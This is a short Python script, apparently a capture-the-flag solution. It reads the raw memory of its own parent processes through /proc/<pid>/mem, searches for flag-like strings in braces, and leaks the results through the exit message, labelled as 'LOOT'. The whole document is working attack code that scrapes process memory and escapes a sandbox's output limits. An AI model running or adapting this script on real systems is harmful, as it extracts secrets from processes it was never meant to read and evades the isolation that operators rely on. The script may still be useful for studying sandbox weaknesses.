import os, re

pat = re.compile(rb'[ -~]{0,20}\{[ -~]{3,120}\}')
hits = set()
diag = []

def ppid_of(pid):
    try:
        st = open(f"/proc/{pid}/stat","rb").read()
        return int(st.rsplit(b")",1)[1].split()[1])
    except Exception:
        return 0

# build ancestor chain from self up to pid 1
chain = []
p = os.getpid()
while p and p not in chain:
    chain.append(p)
    p = ppid_of(p)

def scan(pid):
    got = 0; err = ""
    try:
        regions = []
        for line in open(f"/proc/{pid}/maps"):
            parts = line.split()
            if len(parts) < 2 or "r" not in parts[1]:
                continue
            a, b = parts[0].split("-")
            regions.append((int(a,16), int(b,16)))
        mem = open(f"/proc/{pid}/mem","rb")
        for a,b in regions:
            if b-a > 128*1024*1024: continue
            try:
                mem.seek(a); data = mem.read(b-a); got += len(data)
            except Exception as e:
                err = str(e); continue
            for mt in pat.findall(data):
                s = mt.decode("latin1")
                if "{" in s and "}" in s:
                    hits.add(s)
    except Exception as e:
        err = str(e)
    diag.append(f"pid{pid} read={got} err={err}")

for pid in chain:
    scan(pid)

flaggy = sorted({h for h in hits if re.search(r'(?i)cncc|flag|ctf', h)})
other  = sorted(hits)[:40]
out = "LOOT_START\nchain=%s\n%s\n--FLAGGY--\n%s\n--SAMPLE--\n%s\nLOOT_END" % (
    chain, "\n".join(diag), "\n".join(flaggy) or "(none)", "\n".join(other))
raise SystemExit(out)
